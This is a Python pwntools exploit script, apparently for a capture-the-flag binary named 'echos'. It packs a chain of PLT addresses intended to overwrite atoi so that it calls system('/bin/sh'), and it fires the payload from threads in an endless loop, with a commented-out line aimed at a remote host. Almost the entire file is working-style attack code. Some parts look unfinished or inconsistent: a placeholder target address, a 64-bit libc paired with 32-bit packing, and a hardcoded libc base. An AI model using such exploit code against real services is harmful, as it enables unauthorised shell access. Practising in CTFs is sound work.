from pwn import *
import time
import threading

#libc = ELF("./libc-2.23.so")
elf = ELF("./echos")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
libc_base = 0xf7f7fcb0 - 0xe6cb0
rop_ret = 0x08048436

payload = b"\xf7\xf7" # read
payload += p32(elf.plt["printf"] + 6)
payload += p32(rop_ret)
payload += p32(elf.plt["puts"] + 6)
payload += p32(0x8048540)
payload += p32(elf.plt["strlen"] + 6)
payload += p32(rop_ret)
payload += p32(elf.plt["write"] + 6)
payload += p32(elf.plt["memset"] + 6)
payload += p32(elf.plt["pipe"] + 6)
payload += p32(elf.plt["fork"] + 6)
payload += p32(0xdeadbabe) # goal:atoi --> system("/bin/sh")
payload += p32(elf.plt["close"] + 6)

def worker():
    try:
        #sock = remote("10.66.20.180", 3000)
        sock = process("./echos")
        sock.sendline("8000")
        sock.sendline(payload)
        time.sleep(1.0)
        sock.sendline("100")
        sock.sendline("Hello")
        print(repr(sock.recv()))
        print(repr(sock.recv()))
    except:
        pass
    finally:
        sock.close()

while True:
    th = threading.Thread(target=worker, args=())
    th.start()
    time.sleep(0.1)
